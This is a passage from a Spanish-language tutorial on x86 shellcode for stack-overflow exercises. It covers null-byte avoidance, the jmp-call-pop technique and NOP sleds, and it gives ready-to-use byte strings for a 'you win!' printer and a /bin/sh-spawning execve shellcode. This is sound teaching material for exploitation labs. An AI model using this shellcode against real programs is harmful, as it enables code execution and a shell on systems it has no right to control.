      <li>¿Cómo finalizar el string a imprimir sin usar un caracter especial que trunque el shellcode (como el caracter nulo <code class="highlighter-rouge">\0</code>, nueva línea <code class="highlighter-rouge">\x0a</code> o <em>retorno de carro</em> <code class="highlighter-rouge">\x0d</code>)?    <br />
En estos casos usamos un caracter cualquiera para finalizar el string (por ejemplo la letra <code class="highlighter-rouge">A</code>) y después reemplazamos su valor por <code class="highlighter-rouge">\0</code>.
        <div class="language-nasm highlighter-rouge"><pre class="codehilite"><code>     <span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
      <span class="kr">global</span> <span class="n">_start</span>

      <span class="n">_start</span><span class="o">:</span>
<span class="o">+---&lt;</span>   <span class="k">jmp</span> <span class="n">short</span> <span class="n">dummy</span>        <span class="c">; 1. salto a un dummy con el call</span>
<span class="o">|</span> 
<span class="o">|</span>  <span class="o">-&gt;</span> <span class="n">imprimir_str</span><span class="o">:</span>            <span class="c">; 3. syscall write()</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">pop</span> <span class="n">ecx</span>                  <span class="c">; ecx =&gt; 'you win!A'</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="err">[</span><span class="n">ecx</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">al</span>          <span class="c">; ecx =&gt; 'you win!\0'</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="p">....</span>
<span class="o">|</span>  <span class="o">|</span> 
<span class="o">--&gt;|</span>  <span class="n">dummy</span><span class="o">:</span>                   
   <span class="o">+--&lt;</span> <span class="k">call</span> <span class="n">imprimir_str</span>      <span class="c">; 2. llamo al código encargado de imprimir el mensaje</span>
        <span class="kt">db</span> <span class="err">'</span><span class="n">you</span> <span class="n">win</span><span class="err">!</span><span class="n">A</span><span class="err">'</span>         <span class="c">; antes de saltar apila dirección de "you win!A"</span>
                               <span class="c">; para retornar luego del call</span>
</code></pre>        </div>

        <p>Como resultado final tenemos en <code class="highlighter-rouge">ecx</code> la dirección del string <code class="highlighter-rouge">you win!\0</code>.</p>
      </li>
    </ul>
  </li>
</ol>

<blockquote>
  <p><strong>Consideraciones</strong></p>
  <ul>
    <li><strong>db</strong>: es la directiva <em>define byte</em> que permite reservar espacio en memoria para un string, como en <code class="highlighter-rouge">db 'you win!A'</code>.</li>
  </ul>
</blockquote>

<ol>
  <li><strong>Mínima longitud</strong>: en muchos casos dos instrucciones en assembler cumplen el mismo objetivo pero una de ellas consume menos bytes. Hay que estar atentxs para optar siempre por la opción menos costosa en espacio.   <br />
Por ejemplo si un syscall obliga a poner en 1 un registro, existen dos maneras de hacerlo:
    <div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">instrucci</span><span class="err">ó</span><span class="n">n</span>      <span class="o">|</span> <span class="n">c</span><span class="err">ó</span><span class="n">digo</span> <span class="n">m</span><span class="err">á</span><span class="n">quina</span>
<span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>       <span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xdb</span>                 <span class="c">; ebx = 00 00 00 00</span>
<span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mi">1</span>          <span class="err">\</span><span class="n">xb3</span><span class="err">\</span><span class="n">x01</span>                 <span class="c">; ebx = 00 00 00 01</span>
</code></pre>    </div>
    <p><code class="highlighter-rouge">nasm
instrucción      | código máquina
xor ebx, ebx       \x31\xdb                 ; ebx = 00 00 00 00
inc ebx            \x43                     ; ebx = 00 00 00 01
</code>
¡Usando <code class="highlighter-rouge">inc</code> en vez de <code class="highlighter-rouge">mov</code> ahorramos 8 bits! Parece poco pero es clave cuando almacenamos un shellcode en espacios de memoria reducidos.</p>
  </li>
</ol>

<h4 id="shellcode-que-imprime-you-win">Shellcode que imprime “you win!”</h4>
<ol>
  <li>Código en assembler:
<code class="highlighter-rouge">shellcode.asm</code>
    <div class="language-nasm highlighter-rouge"><pre class="codehilite"><code>        <span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
         <span class="kr">global</span> <span class="n">_start</span>
         <span class="n">_start</span><span class="o">:</span>
   <span class="o">+---&lt;</span>   <span class="k">jmp</span> <span class="n">short</span> <span class="n">dummy</span>        <span class="c">; 1.</span>
   <span class="o">|</span> 
   <span class="o">|</span>  <span class="o">-&gt;</span> <span class="n">imprimir_str</span><span class="o">:</span>            <span class="c">; 3.</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>            <span class="c">; eax = 0</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">pop</span> <span class="n">ecx</span>                <span class="c">; ecx =&gt; "you win!A"</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="err">[</span><span class="n">ecx</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span><span class="n">al</span>         <span class="c">; ecx =&gt; "you win!\0"</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span><span class="mi">4</span>               <span class="c">; syscall write: #4</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>            <span class="c">; ebx = 0</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">inc</span> <span class="n">ebx</span>                <span class="c">; stdout filedescriptor: #1</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>            <span class="c">; edx = 0</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="n">dl</span><span class="p">,</span><span class="mi">9</span>               <span class="c">; longitud "you win!\0": 9</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">int</span> <span class="mh">0x80</span>               <span class="c">; write(1, string, 9)</span>
   <span class="o">|</span>  <span class="o">|</span>    
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span><span class="mi">1</span>               <span class="c">; syscall exit: #1</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">dec</span> <span class="n">ebx</span>                <span class="c">; ebx = 0</span>
   <span class="o">|</span>  <span class="o">|</span>    <span class="k">int</span> <span class="mh">0x80</span>               <span class="c">; exit(0)</span>
   <span class="o">|</span>  <span class="o">|</span>
   <span class="o">--&gt;|</span>  <span class="n">dummy</span><span class="o">:</span>                   <span class="c">; 2.</span>
      <span class="o">+--&lt;</span> <span class="k">call</span> <span class="n">imprimir_str</span>      <span class="c">; apilo addr "you win!A"</span>
           <span class="kt">db</span> <span class="err">'</span><span class="n">you</span> <span class="n">win</span><span class="err">!</span><span class="n">A</span><span class="err">'</span>
</code></pre>    </div>
  </li>
  <li>
    <p>Shellcode como string<br />
Existen varias maneras de obtener el código de máquina como cadena de caracteres a partir del código assembler. Con herramientas como <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">Online x86 de Defuse</a> o con <a href="https://docs.pwntools.com/en/stable/intro.html#assembly-and-disassembly">pwntools</a> para trabajar en python.   <br />
Otra manera simple de obtenerlo es usando <code class="highlighter-rouge">hexdump</code> desde la consola.</p>

    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">nasm</span><span class="kv"> -f elf shellcode.asm                               ; ensamblamos
</span><span class="w">user@abos:~$ </span><span class="nc">ld</span><span class="kv"> -N shellcode.o -o shellcode                          ; linkeamos
</span><span class="w">user@abos:~$ </span><span class="nc">objcopy</span><span class="kv"> -j .text -O binary shellcode.o shellcode.bin    ; extraemos section .text 
</span><span class="w">user@abos:~$ </span><span class="nc">hexdump</span><span class="kv"> -v -e '"\\" 1/1 "x%02x"' shellcode.bin; echo    ; extraemos byte code de binario
</span>\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41
</code></pre>    </div>

    <p>Y el código de máquina obtenido debe coincidir con el código de máquina mostrado en la segunda columna al desensamblar con <code class="highlighter-rouge">objdump</code>:</p>
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">objdump</span><span class="kv"> -d -M intel shellcode                     
</span>shellcode:     file format elf32-i386

Disassembly of section .text:
   
08048060 &lt;_start&gt;:
 8048060: eb 16                 jmp    8048078 &lt;dummy&gt;
   
08048062 &lt;imprimir_str&gt;:
 8048062: 31 c0                 xor    eax,eax
 8048064: 59                    pop    ecx
 8048065: 88 41 08              mov    BYTE PTR [ecx+0x8],al
 8048068: b0 04                 mov    al,0x4
 804806a: 31 db                 xor    ebx,ebx
 804806c: 43                    inc    ebx
 804806d: 31 d2                 xor    edx,edx
 804806f: b2 09                 mov    dl,0x9
 8048071: cd 80                 int    0x80
 8048073: b0 01                 mov    al,0x1
 8048075: 4b                    dec    ebx
 8048076: cd 80                 int    0x80
   
08048078 &lt;dummy&gt;:
 8048078: e8 e5 ff ff ff        call   8048062 &lt;imprimir_str&gt;
 804807d: 79 6f                 jns    80480ee &lt;_end+0x66&gt;   ; \x79\x6f = "yo"
 804807f: 75 20                 jne    80480a1 &lt;_end+0x19&gt;   ; \x75\x20 = "u "
 8048081: 77 69                 ja     80480ec &lt;_end+0x64&gt;   ; \x77\x69 = "wi"
 8048083: 6e                    outs   dx,BYTE PTR ds:[esi]  ; \x6e = "n"
 8048084: 21                    .byte 0x21                   ; \x21 = "!"
 8048085: 41                    inc    ecx                   ; \x41 = "A"
   
</code></pre>    </div>
    <p>Es posible ver como el string es interpretado como instrucciones; es necesario obviarlas y convertir a ASCII el código máquina para verificar el texto “you win!A”</p>
  </li>
</ol>

<p>En todos los casos el shellcode como string que vamos a usar en los exploits para imprimir el mensaje “you win!” va a ser:</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code>   shellcode  = "\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43"
   shellcode += "\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5"
   shellcode += "\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41"           
</code></pre></div>

<h4 id="shellcode-para-lograr-una-shell">Shellcode para lograr una shell</h4>
<p>El siguiente código de ejemplo fue tomado del libro <a href="#material-consultado">Hacking the art of exploitation</a>.
Suponiendo que queremos obtener una shell con nuestro shellcode, de manera similar al siguiente programa en C:</p>

<div class="language-c highlighter-rouge"><pre class="codehilite"><code><span class="cp">#include &lt;unistd.h&gt;
</span> 
<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
	<span class="kt">char</span> <span class="n">filename</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="o">**</span><span class="n">envp</span><span class="p">;</span>

	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">filename</span><span class="p">;</span>             <span class="c1">// único argumento: nombre del programa
</span>	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                    <span class="c1">// \0 fin del array de argumentos
</span>
	<span class="n">envp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                    <span class="c1">// \0 fin del array de entorno
</span>
	<span class="n">execve</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<ol>
  <li>Código en assembler:
<code class="highlighter-rouge">shellcode.asm</code>
    <div class="language-nasm highlighter-rouge"><pre class="codehilite"><code>     <span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
       <span class="kr">global</span> <span class="n">_start</span>

      <span class="n">_start</span><span class="o">:</span>
<span class="o">+---&lt;</span>   <span class="k">jmp</span> <span class="n">short</span> <span class="n">dummy</span>        <span class="c">; 1.</span>
<span class="o">|</span> 
<span class="o">|</span>  <span class="o">-&gt;</span> <span class="n">shellcode</span><span class="o">:</span>               <span class="c">; 3.</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>            <span class="c">; eax = 0</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">pop</span> <span class="n">ebx</span>                <span class="c">; ebx =&gt; "/bin/shABBBBCCCC"</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="err">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">7</span><span class="err">]</span><span class="p">,</span> <span class="n">al</span>        <span class="c">; execve("/bin/sh\0", BBBB, CCCC).</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="err">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">ebx</span>       <span class="c">; execve("/bin/sh\0", &amp;"/bin/sh", CCCC). [ebx+8]: argv</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="err">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">12</span><span class="err">]</span><span class="p">,</span><span class="n">eax</span>       <span class="c">; execve("/bin/sh\0", &amp;"/bin/sh", 0000). [ebx+12]: envp</span>
<span class="o">|</span>  <span class="o">|</span>  
<span class="o">|</span>  <span class="o">|</span>    <span class="k">lea</span> <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span>       <span class="c">; ecx = argv</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">lea</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">12</span><span class="err">]</span>      <span class="c">; edx = envp</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span><span class="mi">11</span>              <span class="c">; syscall execve: #11</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">int</span> <span class="mh">0x80</span>               <span class="c">; execve("/bin/sh\0", &amp;"/bin/sh", 0000)</span>
<span class="o">|</span>  <span class="o">|</span>    
<span class="o">|</span>  <span class="o">|</span>    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span><span class="mi">1</span>               <span class="c">; syscall exit: #1</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>           <span class="c">; ebx = 0</span>
<span class="o">|</span>  <span class="o">|</span>    <span class="k">int</span> <span class="mh">0x80</span>               <span class="c">; exit(0)</span>
<span class="o">|</span>  <span class="o">|</span>
<span class="o">--&gt;|</span>  <span class="n">dummy</span><span class="o">:</span>                   <span class="c">; 2.</span>
   <span class="o">+--&lt;</span> <span class="k">call</span> <span class="n">shellcode</span>         <span class="c">; apilo addr "/bin/shABBBBCCCC"</span>
        <span class="kt">db</span> <span class="err">'</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">shABBBBCCCC</span><span class="err">'</span>  <span class="c">; execve(/bin/shA, BBBB, CCCC);</span>
</code></pre>    </div>
  </li>
  <li>Shellcode como string
  ```shell_session
user@abos:~$ nasm -f elf shellcode.asm                               ; ensamblamos
user@abos:~$ ld -N shellcode.o -o shellcode                          ; linkeamos
user@abos:~$ objcopy -j .text -O binary shellcode.o shellcode.bin    ; extraemos section .text 
user@abos:~$ hexdump -v -e ‘”\” 1/1 “x%02x”’ shellcode.bin; echo    ; extraemos byte code de binario
\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43
    <div class="highlighter-rouge"><pre class="codehilite"><code>El shellcode como string que vamos a usar en los exploits para obtener una shell va a ser:    
```shell_session 
shellcode  = "\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
shellcode += "\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01"
shellcode += "\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f"
shellcode += "\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"          
</code></pre>    </div>
  </li>
</ol>

<p>Acá se presentan dos ejemplos de shellcodes, sin dudas existen muchas variantes que logran el mismo objetivo.</p>

<h3 id="tobogn-de-nops">Tobogán de NOPs</h3>
<p>Una dificultad a la hora de ejecutar el shellcode radica en saber exactamente en qué dirección de memoria se encuentra.   <br />
Para evitar errarle por pocos bytes se usa como recurso la instrucción No-Op o NOP (No Operation instruction). Cada NOP ocupa un byte (0x90 en Assembler) y es una instrucción que no hace nada, sólo avanza el contador del programa a la siguiente instrucción a ejecutar.    <br />
Si se agregan varias instrucciones NOP (formando un <code class="highlighter-rouge">NOP sled</code> o tobogán de Nops que -sin hacer nada- lleven hacia la ejecución del shellcode) y se modifica el flujo de ejecución para que salte allí, sabemos que eventualmente el shellcode se va a ejecutar.   <br />
Esto permite tener margen de error al definir la dirección de retorno y aumenta las chances de ejecutar el shellcode.</p>

<p><img src="imagenes/nops.png" alt="nops" /></p>

<h3 id="prctica">Práctica</h3>
<p>Con los contenidos vistos hasta el momento es posible avanzar con <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/stack4.c">Stack 4</a>, <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/stack5.c">Stack 5</a> y <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/abo1.c">Abo 1</a>.    <br />
Y está disponible una práctica guiada para la <a href="2-practica.md">resolución de Stack 4 y 5 a través del ataque “Smash the stack”</a>.</p>

<h2 id="material-consultado">Material consultado</h2>
<p>[1]. Anley, C., Heasman, J., Linder, F., Richarte, G. (2007). The Shellcoder’s Handbook: Discovering and Exploiting Security Holes.   <br />
[2]. Erickson, Jon. (2008). Hacking: the art of exploitation.   <br />
[3]. D’Antoine, Sophia. (2015). Shellcoding: Modern Binary Exploitation CSCI 4968. Disponible en: http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf</p>


</div>

    </div>

  </body>
</html>
